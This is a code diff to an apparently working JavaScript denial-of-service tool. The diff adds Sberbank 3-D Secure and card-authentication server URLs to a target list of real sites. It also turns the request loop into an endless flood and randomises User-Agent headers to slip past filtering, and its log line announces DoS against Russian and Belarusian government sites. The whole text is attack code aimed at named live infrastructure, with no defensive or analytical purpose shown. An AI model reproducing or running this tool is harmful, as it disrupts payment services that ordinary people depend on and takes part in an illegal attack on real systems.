@@ -178,7 +178,18 @@ const targets = [
   'https://ddos-guard.net/ru',
   'https://stormwall.pro/',
   'https://qrator.net/ru/',
-  'https://solidwall.ru/'
+  'https://solidwall.ru/',
+
+  'https://scr.online.sberbank.ru/api/fl/idgib-w-3ds/',
+  'https://3dsec.sberbank.ru/mportal3/auth/login/',
+  'https://acs1.sbrf.ru/',
+  'https://acs2.sbrf.ru/',
+  'https://acs3.sbrf.ru/',
+  'https://acs4.sbrf.ru/',
+  'https://acs5.sbrf.ru/',
+  'https://acs6.sbrf.ru/',
+  'https://acs7.sbrf.ru/',
+  'https://acs8.sbrf.ru/'
 ]
 
 function isDown (lastSuccessfulResponseTime) {
@@ -187,7 +198,7 @@ function isDown (lastSuccessfulResponseTime) {
 }
 
 async function main () {
-  console.log('Starting to DoS russian/belorussian gov sites')
+  console.log('Starting to DoS russian/belarusian gov sites')
 
   let totalRequests = 0
   const requests = targets.reduce((res, target) => {
@@ -199,9 +210,9 @@ async function main () {
     const downSites = Object.values(requests).filter(r => isDown(r.lastSuccessfulResponseTime))
     console.log(`Total down sites: ${downSites.length}/${Object.keys(requests).length}`)
     console.log(`Total request count: ${totalRequests}`)
-  }, 10000)
+  }, 30000)
 
-  setInterval(async () => {
+  while (true) {
     // const upSites = Object.entries(requests).reduce((res, [url, value]) => {
     //   if (!isDown(value.lastSuccessfulResponseTime)) res[url] = value
     //   return res
@@ -209,8 +220,9 @@ async function main () {
     const responses = await axios.all(Object.keys(requests).map(url => axios({
       method: 'get',
       timeout: SITE_TIMEOUT_IN_MS,
+      headers: { 'User-Agent': Math.random().toString(34).slice(2) }, // random string 11 symbols length
       url
-    }).catch(() => {
+    }).catch((e) => {
       requests[url].requests++
     })))
 
@@ -227,7 +239,8 @@ async function main () {
       }
     })
 
-  }, 0)
+    await new Promise(resolve => setTimeout(resolve, 100)); // delay for releasing event-loop for printing logo
+  }
 }
 
 main().catch(e => console.log(e.stack))
